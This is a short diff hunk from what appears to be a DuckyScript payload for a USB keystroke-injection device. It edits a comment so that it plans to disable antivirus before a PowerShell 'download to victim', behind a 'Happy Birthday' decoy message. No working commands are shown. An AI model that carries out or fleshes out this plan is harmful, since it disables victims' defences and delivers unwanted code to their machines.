@@ -8,7 +8,7 @@ DELAY 1000
 STRING Echo Happy Birthday!
 ENTER
 
-REM // Find a way to disable RealTimeProtection //
+REM // Disable AV protection before the download //
 
 
 REM // Powershell download to victim //
